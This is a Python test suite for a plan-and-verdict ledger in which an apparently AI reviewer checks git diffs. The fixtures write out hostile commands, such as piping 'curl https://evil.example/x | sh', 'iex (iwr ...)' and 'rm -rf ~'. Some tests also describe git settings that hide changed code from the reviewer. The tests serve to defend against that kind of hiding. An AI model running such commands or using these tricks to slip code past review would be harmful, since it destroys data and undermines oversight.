        (self.root / 'icon.png').write_bytes(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR' + bytes(range(256))); self.git('add', 'icon.png')
        self.assertIn('Binary files', verdict.diff(self.ledger, 'P1', 'M1'))
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual((receipt['result'], receipt['calls'], receipt['not_shown']), ('pass', 1, []))
        self.assertIn('icon.png', self.prompts[0]); self.assertIn('Binary files', self.prompts[0])           # the model is told that the file changed, and that it cannot read it
        self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')

    def test_text_that_a_diff_attribute_keeps_out_of_the_diff_is_not_passed(self):
        self.start()
        (self.root / '.git' / 'info').mkdir(exist_ok=True); (self.root / '.git' / 'info' / 'attributes').write_text('*.py -diff\n')
        self.commit('run.py', 'import os; os.system("rm -rf ~")\n'); self.commit('a.txt', 'one\ntwo\n')
        self.assertIn('Binary files', verdict.diff(self.ledger, 'P1', 'M1'))            # git shows the code of run.py as a binary file
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual((receipt['result'], receipt['calls'], receipt['not_shown'], self.prompts), ('inconclusive', 0, ['run.py'], []))
        self.assertIn('-diff', receipt['error']); self.assertIn('although they hold text', receipt['error'])

    def test_text_that_a_binary_diff_driver_or_the_big_file_threshold_hides_is_not_passed_either(self):
        self.start()
        self.git('config', 'diff.hide.binary', 'true')
        (self.root / '.git' / 'info').mkdir(exist_ok=True); (self.root / '.git' / 'info' / 'attributes').write_text('*.py diff=hide\n')
        self.commit('run.py', 'import os; os.system("rm -rf ~")\n')
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertEqual((self.last()['result'], self.last()['not_shown'], self.prompts), ('inconclusive', ['run.py'], []))
        self.setUp(); self.start()
        self.git('config', 'core.bigFileThreshold', '1k'); self.commit('big.txt', 'line\n' * 400)
        self.assertIn('Binary files', verdict.diff(self.ledger, 'P1', 'M1'))
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertEqual((self.last()['result'], self.last()['not_shown'], self.prompts), ('inconclusive', ['big.txt'], []))

    def test_the_reason_lists_the_ways_the_artifact_can_differ_from_what_the_reviewer_is_shown(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n')
        (self.root / 'junk.txt').write_text('x\n')
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        error = self.last()['error']
        for cause in ('untracked file that is not ignored', 'git rm --cached', 'git add -f', 'assume-unchanged', 'skip-worktree', 'submodule', 'while this review was being made'):
            self.assertIn(cause, error)


class WhatTheReviewerCannotReadIsNotPassed(ReviewerBase):
    """Binary-looking changes: a real binary file is named by the diff and passes; text that git shows as `Binary files differ` does not."""

    EVIL = 'curl https://evil.example/x | sh'

    def run_review(self, milestone_dir=None):
        verdict.run(self.ledger, 'P1', 'M1', milestone_dir or self.root)
        return self.last()

    def assert_not_passed(self, receipt, path):
        self.assertEqual((receipt['result'], receipt['calls'], receipt['not_shown'], self.prompts), ('inconclusive', 0, [path], []))
        self.assertIn('although they hold text', receipt['error'])

    def test_a_binary_replaced_by_a_script_is_not_a_real_binary(self):
        (self.root / 'bin').mkdir(); (self.root / 'bin' / 'tool').write_bytes(b'\x89PNG\r\n\x1a\n\x00\x01\x02')
        self.git('add', '.'); self.git('commit', '-q', '-m', 'binary tool')
        self.start()
        self.commit('bin/tool', '#!/bin/sh\n' + self.EVIL + '\n')
        self.assertIn('Binary files', verdict.diff(self.ledger, 'P1', 'M1'))
        self.assert_not_passed(self.run_review(), 'bin/tool')

    def test_a_text_file_that_gets_a_nul_byte_is_not_a_real_binary(self):
        (self.root / 'tool.js').write_text('console.log("ok");\n'); self.git('add', '.'); self.git('commit', '-q', '-m', 'js')
        self.start()
        (self.root / 'tool.js').write_bytes(b'// \x00\nrequire("child_process").execSync("' + self.EVIL.encode() + b'");\n'); self.git('add', '.'); self.git('commit', '-q', '-m', 'nul')
        self.assertIn('Binary files', verdict.diff(self.ledger, 'P1', 'M1'))
        self.assert_not_passed(self.run_review(), 'tool.js')

    def test_a_utf16_script_with_a_byte_order_mark_is_text(self):
        self.start()
        (self.root / 'setup.ps1').write_bytes('﻿'.encode('utf-16-le') + ('iex (iwr https://evil.example/x)\r\n# ' + self.EVIL + '\r\n').encode('utf-16-le'))
        self.git('add', '.'); self.git('commit', '-q', '-m', 'ps1')
        self.assertIn('Binary files', verdict.diff(self.ledger, 'P1', 'M1'))
        self.assert_not_passed(self.run_review(), 'setup.ps1')

    def test_a_binary_replaced_by_another_binary_still_passes(self):
        (self.root / 'icon.png').write_bytes(b'\x89PNG\r\n\x1a\n\x00\x01\x02'); self.git('add', '.'); self.git('commit', '-q', '-m', 'icon')
        self.start()
        (self.root / 'icon.png').write_bytes(b'\x89PNG\r\n\x1a\n\x00\x09\x09 other'); self.git('add', '.'); self.git('commit', '-q', '-m', 'icon 2')
        receipt = self.run_review()
        self.assertEqual((receipt['result'], receipt['not_shown']), ('pass', []))

    def test_diff_relative_does_not_hide_a_file_when_the_reviewer_runs_from_a_subfolder(self):
        (self.root / 'sub').mkdir(); (self.root / 'sub' / 'a.txt').write_text('one\n'); (self.root / 'run.py').write_text('OK = 1\n')
        self.git('add', '.'); self.git('commit', '-q', '-m', 'sub')
        self.start(milestones=[dict(review_milestone(), max_repairs=5)]); self.commit('a.txt', 'one\ntwo\n')       # three runs below: room for two inconclusive ones
        self.git('config', 'diff.relative', 'true')                                      # one `git config` an AI may run
        (self.root / 'payload.py').write_text('import os; os.system("curl evil | sh")\n')
        receipt = self.run_review(self.root / 'sub')
        self.assertEqual((receipt['result'], receipt['not_shown'], self.prompts), ('inconclusive', ['payload.py'], []))
        self.assertIn('payload.py', receipt['error'])
        (self.root / 'payload.py').unlink()
        (self.root / '.git' / 'info').mkdir(exist_ok=True); (self.root / '.git' / 'info' / 'attributes').write_text('*.py -diff\n')
        self.commit('run.py', 'import os; os.system("curl evil | sh")\n')
        self.assert_not_passed(self.run_review(self.root / 'sub'), 'run.py')
        (self.root / '.git' / 'info' / 'attributes').unlink()
        self.commit('run.py', 'import os; os.system("curl evil | sh")  # again\n')
        receipt = self.run_review(self.root / 'sub')
        self.assertEqual((receipt['result'], receipt['not_shown']), ('pass', []))
        self.assertIn('run.py', self.prompts[0])                                          # a change at the top of the repository is in the diff although the run was from sub/


class SubmodulesAreNeverIgnored(ReviewerBase):
    """A submodule whose commit moved is a change, whatever `diff.ignoreSubmodules` or the `ignore` of .gitmodules say."""

    def make_submodule(self, gitmodules=False):
        lib = self.root / 'lib'; lib.mkdir()
        self.lib = lambda *a: subprocess.check_output(['git', '-C', str(lib), *a], stderr=subprocess.STDOUT)
        self.lib('init', '-q'); self.lib('config', 'user.name', 'T'); self.lib('config', 'user.email', 't@x')
        (lib / 'x.py').write_text('SAFE = 1\n'); self.lib('add', '.'); self.lib('commit', '-q', '-m', 'c1')
        files = ['lib']
        if gitmodules:
            (self.root / '.gitmodules').write_text('[submodule "lib"]\n\tpath = lib\n\turl = ./lib\n\tignore = all\n'); files.append('.gitmodules')
        self.git('add', *files); self.git('commit', '-q', '-m', 'submodule')

    def bump(self):
        (self.root / 'lib' / 'x.py').write_text('import os; os.system("curl evil | sh")\n')
        self.lib('commit', '-qam', 'c2'); self.git('add', 'lib'); self.git('commit', '-q', '-m', 'bump the submodule')

    def check_in_the_diff(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n'); self.bump()
        self.assertIn('diff --git a/lib b/lib', verdict.diff(self.ledger, 'P1', 'M1'))
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual((receipt['result'], receipt['not_shown']), ('pass', []))
        self.assertIn('Subproject commit', self.prompts[0]); self.assertIn('diff --git a/lib b/lib', self.prompts[0])

    def test_ignore_all_in_the_git_configuration_does_not_hide_a_bump(self):
        self.make_submodule(); self.git('config', 'diff.ignoreSubmodules', 'all')
        self.check_in_the_diff()

    def test_ignore_all_in_gitmodules_does_not_hide_a_bump(self):
        self.make_submodule(gitmodules=True)
        self.check_in_the_diff()

    def test_a_log_style_submodule_diff_configuration_does_not_make_the_review_inconclusive(self):
        self.make_submodule(); self.git('config', 'diff.submodule', 'log')                  # git then prints a log and no `diff --git` header for the submodule
        self.check_in_the_diff()

    def test_a_submodule_bump_is_not_a_neutral_change(self):
        self.make_submodule(gitmodules=True)
        self.approved(value=plan_json(scope={'owned': ['a.txt'], 'neutral': ['docs/**']}))
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        before = self.tree()
        (self.root / 'docs').mkdir(); (self.root / 'docs' / 'r.md').write_text('# r\n'); self.git('add', 'docs')
        self.bump()
        self.assertEqual(command.changed_paths(self.root, before, self.tree()), ['docs/r.md', 'lib'])
        view = self.view()
        self.assertNotEqual(view['state'], 'passed'); self.assertNotIn('neutral_diff', view)
        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())


class ReviewerDiffIsOneTree(ReviewerBase):
    def test_a_working_tree_whose_artifact_cannot_be_made_gives_an_inconclusive_receipt_not_an_error(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n')
        with patch.object(command, 'artifact_sha', side_effect=LedgerError('git is gone')): verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual((receipt['result'], receipt['calls'], receipt['artifact_sha'], self.prompts), ('inconclusive', 0, '0' * 40, []))
        self.assertIn('git is gone', receipt['error'])
        self.assertNotEqual(self.view()['state'], 'passed')

    def test_a_change_made_after_the_diff_was_cut_cannot_pass(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n')
        cut = reviewer.review_diff

        def cut_then_edit(*args, **kwargs):
            out = cut(*args, **kwargs)
            (self.root / 'a.txt').write_text('one\ntwo\nSNUCK-IN-AFTER-THE-DIFF\n')
            return out
        with patch.object(reviewer, 'review_diff', cut_then_edit): verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual(receipt['result'], 'inconclusive')
        self.assertNotEqual(receipt['artifact_sha'], receipt['artifact_sha_after'])
        for prompt in self.prompts: self.assertNotIn('SNUCK-IN', prompt)
        self.assertNotEqual(self.view()['state'], 'passed')
        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())

    def test_a_change_made_between_the_artifact_and_the_tree_is_named_not_attributed_to_the_tree(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n')
        take = command.tracked_tree

        def edit_then_take(directory):
            (self.root / 'a.txt').write_text('one\ntwo\nAPPEARED-BETWEEN\n')
            return take(directory)
        with patch.object(command, 'tracked_tree', edit_then_take): verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual((receipt['result'], receipt['calls'], receipt['not_shown']), ('inconclusive', 0, ['a.txt']))

    def test_the_diff_in_the_receipt_is_exactly_the_diff_between_the_two_recorded_trees(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n')
        (self.root / 'staged.py').write_text('STAGED_MARK = 1\n'); self.git('add', 'staged.py')
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual(receipt['result'], 'pass')
        approved = [p for k, p in self.events() if k == 'plan.approved'][0]
        self.assertEqual(receipt['base_tracked'], approved['base_tracked'])
        self.assertEqual(self.blob(receipt['diff']), self.git('diff', '--no-color', '--no-ext-diff', '--no-textconv', '-U3', receipt['base_tracked'], receipt['tracked_tree']))
        self.assertIn(self.blob(receipt['diff']), self.prompts[0])
        self.assertEqual(receipt['tracked_tree'], command.tracked_tree(self.root))


class TreeIdsFromReceipts(ReviewerBase):
    def test_a_tree_id_is_hex_before_git_sees_it_and_never_an_option(self):
        out = self.root.parent / 'evil-diff.txt'
        for bad in ('--output=' + str(out), '--stat', 'HEAD', '', None, 'a' * 39):
            with self.subTest(bad=bad), self.assertRaises(LedgerError):
                reviewer.tree_diff(self.root, bad, self.git('rev-parse', 'HEAD^{tree}'))
            with self.subTest(bad=bad, side='after'), self.assertRaises(LedgerError):
                reviewer.tree_diff(self.root, self.git('rev-parse', 'HEAD^{tree}'), bad)
        self.assertFalse(out.exists())

    def test_a_receipt_whose_tracked_tree_is_not_hex_is_not_a_base(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n')
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        body = self.last()
        evil = self.root.parent / 'evil-output.txt'
        with patch.object(verdict, '_receipt_body', return_value=dict(body, tracked_tree='--output=' + str(evil))):
            text = verdict.diff(self.ledger, 'P1', 'M1')
        self.assertFalse(evil.exists())
        self.assertIn('+two', text)                                              # the diff starts from the approval, as if the pass had recorded no tree

    def test_an_approval_whose_base_is_not_a_tree_gives_an_inconclusive_receipt_with_the_reason(self):
        with patch.object(plans, '_base_tracked', return_value='--output=whatever'): self.start()
        self.commit('a.txt', 'one\ntwo\n')
        with self.assertRaises(LedgerError) as caught: verdict.diff(self.ledger, 'P1', 'M1')
        self.assertIn('tree id', str(caught.exception))
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual((receipt['result'], receipt['calls'], self.prompts, receipt['base_source']), ('inconclusive', 0, [], 'none'))
        self.assertIn('tree id', receipt['error'])

    def test_a_plan_approved_before_the_tracked_base_existed_gives_an_inconclusive_receipt_with_the_reason(self):
        """An old plan: no base_tracked, no base_artifact, and every commit is later than the approval, so the commit-before-approval guess finds nothing
        (8383446 raised `No commit before the approval` out of verdict run)."""
        later = dict(os.environ, GIT_COMMITTER_DATE='2099-01-01T00:00:00', GIT_AUTHOR_DATE='2099-01-01T00:00:00')
        commit = lambda *a: subprocess.check_call(['git', '-C', str(self.root), 'commit', '-q', *a], env=later)
        commit('--amend', '--no-edit', '--date=2099-01-01T00:00:00')
        with patch.object(plans, '_base_tracked', return_value=None), patch.object(plans, '_base_artifact', return_value=None): self.start()
        (self.root / 'a.txt').write_text('one\ntwo\n'); self.git('add', '.'); commit('-m', 'work')
        self.assertEqual(self.git('rev-list', '--count', '--before=' + [p for k, p in self.events() if k == 'plan.approved'][0]['at'], 'HEAD'), '0')
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual((receipt['result'], receipt['calls'], self.prompts), ('inconclusive', 0, []))
        self.assertIn('no tracked-only base tree', receipt['error'])
        with self.assertRaises(LedgerError) as caught: verdict.diff(self.ledger, 'P1', 'M1')
        self.assertIn('no tracked-only base tree', str(caught.exception))


# ---- P0.4 and P0.6: what a carried verdict may stand for ----------------------------------------------------------------------------------

class NothingIsNeutralUnlessDeclared(Fixture):
    CODE = 'import sys; sys.path.insert(0, "docs"); import runtime; assert runtime.OK, "runtime.OK is false"; print("runtime ok")'

    def test_there_is_no_built_in_neutral_list(self):
        self.assertFalse(hasattr(contracts, 'NEUTRAL_DEFAULT'))
        self.assertEqual(contracts.neutral_globs(contracts.validate(plan_json())), [])
        self.assertEqual(contracts.neutral_globs(contracts.validate(plan_json(scope={'owned': ['a.txt'], 'neutral': ['docs/**']}))), ['docs/**'])

    def test_code_under_docs_that_a_command_imports_cannot_ride_on_an_old_pass(self):
        (self.root / 'docs').mkdir(); (self.root / 'docs' / 'runtime.py').write_text('OK = True\n'); self.git('add', '.'); self.git('commit', '-q', '-m', 'runtime')
        self.approved(value=plan_json(milestones=[milestone('M1', argv=[sys.executable, '-c', self.CODE])]))
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertEqual(plans.show(self.ledger, 'P1')['milestones'][0]['state'], 'passed')
        (self.root / 'docs' / 'runtime.py').write_text('OK = False\n'); self.git('add', '.'); self.git('commit', '-q', '-m', 'break it under docs/')
        view = plans.show(self.ledger, 'P1')['milestones'][0]
        self.assertNotEqual(view['state'], 'passed'); self.assertNotIn('neutral_diff', view)
        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertEqual(plans.show(self.ledger, 'P1')['milestones'][0]['state'], 'failed')


class CarryNeedsTheSameOutputs(Fixture):
    def two(self, first='The sample exists', second='The docs exist', covers1=('O1',), covers2=('O2',), **extra):
        return plan_json(output=[first, second], milestones=[milestone('M1', covers=list(covers1)), milestone('M2', covers=list(covers2))], **extra)

    def view(self, mid, name='P1'):
        return next(m for m in plans.show(self.ledger, name)['milestones'] if m['id'] == mid)

    def amend_approve(self, value, reason='amended'):
        plans.amend(self.ledger, 'P1', value, reason, 'claude'); plans.approve(self.ledger, 'P1', 'owner', 'ref')

    def passed_on_revision_one(self, value):
        self.approved(value=value)
        for mid in [m['id'] for m in value['milestones']]: verdict.run(self.ledger, 'P1', mid, self.root)

    def test_a_new_covered_output_is_not_checked_by_an_old_pass(self):
        self.passed_on_revision_one(plan_json())
        self.amend_approve(plan_json(output=['The sample exists', 'A NEW requirement'], milestones=[milestone('M1', covers=['O1', 'O2'])]))
        m1 = self.view('M1')
        self.assertEqual(m1['state'], 'pending'); self.assertNotIn('carried_from', m1)
        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')

    def test_rewording_a_covered_output_runs_the_milestone_again(self):
        self.passed_on_revision_one(plan_json())
        self.amend_approve(plan_json(output=['The sample is encrypted']))
        self.assertEqual(self.view('M1')['state'], 'pending')
        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())

    def test_dropping_a_covered_output_from_the_covers_runs_the_milestone_again(self):
        self.passed_on_revision_one(self.two(covers1=('O1', 'O2'), covers2=('O2',)))
        self.amend_approve(self.two(covers1=('O1',), covers2=('O2',)))
        self.assertEqual((self.view('M1')['state'], self.view('M2')['state']), ('pending', 'passed'))

    def test_rewording_an_output_the_milestone_does_not_cover_keeps_its_pass(self):
        self.passed_on_revision_one(self.two())
        self.amend_approve(self.two(second='The docs exist and can be read'))
        m1, m2 = self.view('M1'), self.view('M2')
        self.assertEqual((m1['state'], m1['carried_from']), ('passed', 1))
        self.assertEqual(m2['state'], 'pending'); self.assertNotIn('carried_from', m2)
        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())
        verdict.run(self.ledger, 'P1', 'M2', self.root)
        self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')

    def test_a_reviewer_pass_is_not_carried_to_a_revision_the_reviewer_itself_wrote(self):
        with patch.object(reviewer, 'call', lambda prompt, config, env, scratch, limit: (passing(), {}, None, False, b'raw')):
            plans.propose(self.ledger, 'P1', plan_json(milestones=[review_milestone()]), 'codex'); plans.approve(self.ledger, 'P1', 'owner', 'ref')
            (self.root / 'a.txt').write_text('one\ntwo\n'); self.git('add', '.'); self.git('commit', '-q', '-m', 'work')
            verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertEqual(self.view('M1')['state'], 'passed')
        plans.amend(self.ledger, 'P1', plan_json(milestones=[review_milestone()], title='Retitled by the reviewer'), 'retitle', 'claude-haiku-5-5')
        plans.approve(self.ledger, 'P1', 'owner', 'ref')
        m1 = self.view('M1')
        self.assertEqual(m1['state'], 'pending'); self.assertNotIn('carried_from', m1)
        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())


# ---- P0.5: the report says what plan show says ----------------------------------------------------------------------------------------------

class ReportReadsTheSharedView(ReviewerBase):
    def text(self):
        return report.render_report(self.ledger.state_root, 'P1')

    def test_a_carried_reviewer_pass_and_its_notes_are_in_the_report(self):
        self.reply = passing(['OUTSIDE-NOTE-7731 a stray todo'])
        self.start(); self.commit('a.txt', 'one\ntwo\n')
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        plans.amend(self.ledger, 'P1', plan_json(milestones=[review_milestone()], title='Sample, reworded'), 'wording of the title only', 'codex')
        plans.approve(self.ledger, 'P1', 'owner', 'ref')
        shown = self.view()
        self.assertEqual((shown['state'], shown['carried_from']), ('passed', 1))
        text = self.text()
        self.assertIn('O1 ĐẠT', text); self.assertNotIn('M1 chưa có verdict', text)
        self.assertIn('M1 pass (kế thừa từ bản 1)', text); self.assertIn('M1=pass kế thừa', text)
        self.assertIn('Reviewer ghi chú', text); self.assertIn('OUTSIDE-NOTE-7731', text)

    def test_a_pass_the_artifact_has_left_is_stale_in_the_report_too(self):
        self.approved(); verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertIn('O1 ĐẠT', self.text())
        self.commit('a.txt', 'one\nmore\n')
        shown = self.view()
        self.assertEqual((shown['state'], shown.get('stale')), ('pending', True))
        text = self.text()
        self.assertIn('O1 CHƯA', text); self.assertNotIn('O1 ĐẠT', text)
        self.assertIn('M1=cũ', text)                                                    # the output line says what plan show says: not a pass any more
        self.assertIn('M1 cũ (pass trên artifact khác, cần chạy lại)', text)               # the milestone line does not print `M1 pass`
        self.assertNotIn('M1 pass', text)
        self.assertIn('Vì sao: mốc M1 cũ: đạt trên artifact khác, cần chạy lại', text)     # and the conclusion does not say "no verdict yet"
        self.assertNotIn('chưa có verdict', text)

    def test_an_accepted_plan_is_read_from_its_acceptance_record_not_from_todays_rules(self):
        self.approved(value=plan_json(scope={'owned': ['a.txt'], 'neutral': ['*.md']}))
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.commit('NOTES.md', 'notes\n')                                              # a commit the contract itself calls neutral: the pass is carried over it
        self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')
        text, shown = self.text(), self.view()
        self.assertEqual(shown['state'], 'passed'); self.assertNotIn('neutral_diff', shown); self.assertNotIn('carried_from', shown)      # accepted: no word for a plan still on its way
        self.assertIn('Kết luận: XONG', text); self.assertIn('M1 pass · by command', text); self.assertNotIn('trung lập', text); self.assertNotIn('kế thừa', text)
        accepted = [p for k, p in self.events() if k == 'plan.accepted'][0]
        self.assertEqual(accepted['carried'], {'M1': 1})                                 # what carried the pass is in the acceptance event
        with patch.object(contracts, 'neutral_globs', return_value=[]):                 # rules under which that acceptance would not have been possible
            self.assertEqual(self.view()['state'], 'passed')
            self.assertEqual(self.text(), text)

    def test_an_accepted_carried_verdict_stays_carried_whatever_the_inheritance_rule_says_now(self):
        self.approved(value=plan_json(milestones=[milestone('M1'), milestone('M2')]))
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        plans.amend(self.ledger, 'P1', plan_json(milestones=[milestone('M1'), milestone('M2', title='M2 reworded')]), 'wording', 'codex')
        plans.approve(self.ledger, 'P1', 'owner', 'ref')
        verdict.run(self.ledger, 'P1', 'M2', self.root)
        self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')
        text = self.text()
        self.assertIn('Kết luận: XONG', text); self.assertIn('M1 pass · by command', text); self.assertNotIn('kế thừa', text); self.assertNotIn('M1 chưa có verdict', text)
        self.assertNotIn('carried_from', self.view('M1'))
        with patch.object(plans, '_inherited', return_value=None):
            self.assertEqual(self.view('M1')['state'], 'passed'); self.assertEqual(self.text(), text)

    def test_an_owner_receipt_judged_twice_reads_as_the_verdict_that_was_accepted(self):
        manual = {'id': 'M2', 'title': 'Looks right', 'verifier': {'type': 'owner-manual'}, 'covers': ['O1'], 'max_repairs': 3}
        self.approved(value=plan_json(milestones=[milestone('M1'), manual]))
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        blob = Snapshots(self.ledger.state_root).blob(b'screenshot of the device\n')
        verdict.record(self.ledger, 'P1', 'M2', 'fail', 'owner', blob, self.tree())
        verdict.record(self.ledger, 'P1', 'M2', 'pass', 'owner', blob, self.tree())            # the same evidence file, judged again
        self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')
        shown = self.view('M2')
        self.assertEqual((shown['state'], shown['last_verdict']['result']), ('passed', 'pass'))
        text = self.text()
        self.assertIn('M2 pass · by owner', text); self.assertNotIn('M2 fail', text); self.assertIn('Kết luận: XONG', text)

    def test_accept_refuses_the_null_artifact(self):
        self.approved(); verdict.run(self.ledger, 'P1', 'M1', self.root)
        for null in ('0' * 40, '0' * 64):
            with self.assertRaises(LedgerError) as caught: plans.accept(self.ledger, 'P1', 'owner', 'ref', null)
            self.assertIn('null id', str(caught.exception))
        self.assertNotIn('plan.accepted', self.kinds())

    def test_an_accepted_plan_is_read_at_the_artifact_accepted_so_its_report_does_not_move(self):
        self.approved(); verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')
        before = self.text()
        self.assertIn('O1 ĐẠT', before)
        time.sleep(1.2)                                                            # the report lists the commits made until the last event: this one must come after it
        self.commit('a.txt', 'one\nafter the acceptance\n')
        self.assertEqual(self.text(), before)
        self.assertEqual(self.view()['state'], 'passed')

    def test_the_digest_keeps_reading_what_each_plan_recorded(self):
        self.approved(); verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.commit('a.txt', 'one\nmore\n')
        self.assertIn('O1 CHƯA', self.text())
        digest = report.render_digest(self.ledger.state_root)
        self.assertRegex(digest, r'P1\s+approved\s+mốc 1/1')                       # the recorded pass, as 2.1 counted it; no project is hashed for a digest


if __name__ == '__main__':
    unittest.main()
